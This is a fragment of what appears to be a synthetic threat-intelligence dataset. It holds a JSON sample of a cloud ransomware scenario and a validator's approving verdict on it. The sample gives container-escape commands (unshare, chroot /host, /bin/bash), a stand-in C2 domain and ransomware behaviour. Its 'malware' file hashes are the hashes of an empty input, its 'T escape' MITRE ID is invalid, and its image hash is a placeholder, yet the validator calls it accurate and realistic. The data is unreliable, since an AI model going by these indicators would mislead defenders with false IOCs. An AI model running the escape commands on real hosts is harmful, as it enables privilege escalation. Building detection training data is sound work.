+    ""container_escape_poc"": ""unshare --mount --uts --ipc --net --pid\nmount -t proc proc /proc\nchroot /host\n/bin/bash\n# Access host filesystem and escalate privileges"",
+    ""malicious_container_image"": ""sha256:abc123def4567890fedcba0987654321abcdef1234567890fedcba0987654321"",
+    ""process_chain"": ""ecs-agent -> docker -> malicious container -> /bin/bash (privileged) -> /host/bin/bash"",
+    ""file_hashes"": {
+      ""malware_binary"": {
+        ""md5"": ""d41d8cd98f00b204e9800998ecf8427e"",
+        ""sha1"": ""da39a3ee5e6b4b0d3255bfef95601890afd80709"",
+        ""sha256"": ""e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855""
+      }
+    },
+    ""network_traffic_pattern"": ""Periodic HTTPS POST to C2 server api.malicious-cloud.com with encrypted payload every 10 minutes."",
+    ""ransomware_behavior"": ""Encrypts mounted EFS volumes, deletes backups from S3 bucket by overwriting keys/encryption.key, drops ransom note in cloud storage and container logs.""
+  },
+  ""indicators"": [
+    ""IAM policy with overly permissive s3:* on all resources"",
+    ""CloudTrail logs showing attacker assumed role and unauthorized PutObject activity"",
+    ""API calls to replace encryption keys in cloud backups"",
+    ""Container escape commands executed inside ECS task"",
+    ""Malicious container image SHA256 hash"",
+    ""Network traffic to suspicious external C2 domains over HTTPS"",
+    ""Unexpected deletion and modification of S3 objects in backup bucket""
+  ],
+  ""detection_method"": ""Cloud security posture management detects overly broad IAM policies, CloudTrail anomaly detection flags unusual role assumption and S3 write events, container runtime security detects namespace unsharing and escape attempts, network monitoring flags C2 communications, and backup integrity monitoring alerts on key overwrites."",
+  ""relevant_mitre_techniques"": [
+    ""T1078.004 - Valid Accounts: Cloud Accounts"",
+    ""T1530 - Data from Cloud Storage Object"",
+    ""T1486 - Data Encrypted for Impact"",
+    ""T escape - Container Escape (Custom - see MITRE CAPEC 1000+)"",
+    ""T1531 - Account Access Removal"",
+    ""T1071.001 - Application Layer Protocol: Web Protocols""
+  ]
+}
+
+Return only valid JSON.
+","{""valid"": true, ""issues"": [], ""comments"": ""The sample accurately represents a ransomware-as-a-service scenario within an enterprise cloud environment. It aligns well with the problem nature by illustrating how an affiliate abuses cloud misconfiguration to escalate privileges, deploy ransomware in a containerized environment, and exfiltrate encryption keys. The technical data is detailed and realistic, including IAM policy misconfiguration, CloudTrail logs, API call sequences, container escape proof-of-concept commands, malware hashes, network traffic patterns, and ransomware behavior. The indicators clearly explain why the sample matches the problem, highlighting overly permissive IAM policies, suspicious CloudTrail events, container escape activity, and ransomware actions. Detection methods and relevant MITRE techniques are appropriately included, enhancing completeness. Overall, the sample is comprehensive, plausible, and well-structured, effectively demonstrating the ransomware-as-a-service threat and supporting recommended risk reduction strategies.""}"
